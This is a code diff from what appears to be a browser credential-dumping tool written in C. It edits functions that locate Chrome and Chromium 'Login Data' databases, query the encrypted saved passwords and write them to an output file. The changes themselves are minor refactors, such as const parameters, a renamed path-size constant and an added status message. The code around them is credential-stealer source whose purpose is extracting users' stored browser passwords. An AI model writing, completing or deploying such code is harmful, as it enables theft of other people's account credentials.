@@ -61,7 +61,7 @@ int fetch_sqlite_data(char **website, char **username, char **cipher_password, i
  *
  * @return 1 on success, -1 on failure
  */
-int get_chrome_creds(char *login_data_path, char *output) {
+int get_chrome_creds(char *login_data_path, const char *output) {
 	sqlite3 *db;
 	sqlite3_stmt *stmt;
 	if(prepare_sqlite_statement(login_data_path, &db, &stmt) == -1) {
@@ -129,21 +129,22 @@ int get_chrome_creds(char *login_data_path, char *output) {
 	return 1;
 }
 
-int dump_chrome(int verbose, char *output_file) {
+int dump_chrome(int verbose, const char *output_file) {
+	puts("[*] Starting Chrome dump...");
 	int result = 0;
-	char chrome_path[MAX_PATH];
-	char chrome_login_data_path[MAX_PATH];
-	char chromium_path[MAX_PATH];
-	char chromium_login_data_path[MAX_PATH];
-	//char brave_path[MAX_PATH];
-	//char brave_login_data_path[MAX_PATH];
+	char chrome_path[MAX_PATH_SIZE];
+	char chrome_login_data_path[MAX_PATH_SIZE];
+	char chromium_path[MAX_PATH_SIZE];
+	char chromium_login_data_path[MAX_PATH_SIZE];
+	//char brave_path[MAX_PATH_SIZE];
+	//char brave_login_data_path[MAX_PATH_SIZE];
 
 	// TODO: Add brave support
 
 	load_chrome_paths(chrome_path, chrome_login_data_path, chromium_path, chromium_login_data_path);
 
 	// TODO: S_OK / F_OK ?
-	if(access(chrome_login_data_path,0) != -1  ) {
+	if(access(chrome_login_data_path,0) != -1) {
 		printf("[*] Starting Chrome credentials dump...\n\n");
 		result = get_chrome_creds(chrome_login_data_path, output_file);
 	}
